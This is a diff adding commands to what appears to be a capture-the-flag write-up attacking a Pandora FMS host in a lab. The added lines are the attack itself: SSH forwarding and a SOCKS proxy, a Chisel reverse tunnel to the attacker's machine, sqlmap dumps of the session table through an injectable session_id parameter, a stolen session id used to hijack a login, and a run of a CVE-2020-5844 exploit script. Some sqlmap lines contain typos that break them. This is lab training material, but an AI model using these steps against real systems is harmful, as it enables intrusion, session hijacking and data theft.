@@ -11,43 +11,43 @@ ssh jimmy@10.129.227.110 -L 52846:localhost:52846
 ```
 
 ```
-
+ssh -D 9090 daniel@10.129.226.249
 ```
 
 ```
-
+scp agent daniel@10.129.226.249:~/Desktop
 ```
 
 ```
-
+sudo ip route add 10.129.226.249/16 dev ligolo
 ```
 
 ```
-
+./Chisel client 10.10.16.66:9999 R:8888:127.0.0.1:80
 ```
 
 ```
-
+sqlmap --url="http://127.0.0.1:8888/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
 ```
 
 ```
-
+sqlmap -- url="http://127.0.0.1:8888/pandora_console/include/chart_generator.php?session_id=''" - tsessions_php --dump
 ```
 
 ```
-
+sqlmap --url="http://127.0.0.1:8888/pandora_console/include/chart_generator.php?session_id=''" - Ttsessions_php --dump
 ```
 
 ```
-
+g4e01qdgk36mfdh90hvcc54umq
 ```
 
 ```
-
+http://127.0.0.1:8888/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
 ```
 
 ```
-
+python3 exploit-CVE-2020-5844.py -t 127.0.0.1 8888 -p g4e01qdgk36mfdh90hvcc54umq
 ```
 
 ```
